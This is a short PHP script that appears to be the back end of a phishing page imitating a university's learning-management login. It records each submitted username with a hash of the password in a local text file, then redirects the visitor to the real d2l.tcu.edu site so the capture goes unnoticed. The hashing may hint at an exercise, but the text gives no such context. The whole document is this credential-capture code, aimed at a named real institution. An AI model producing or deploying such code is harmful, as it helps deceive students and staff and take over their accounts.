<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . password_hash($_POST['password'], PASSWORD_DEFAULT) . "\n", FILE_APPEND);
header('Location: http://d2l.tcu.edu');
exit();
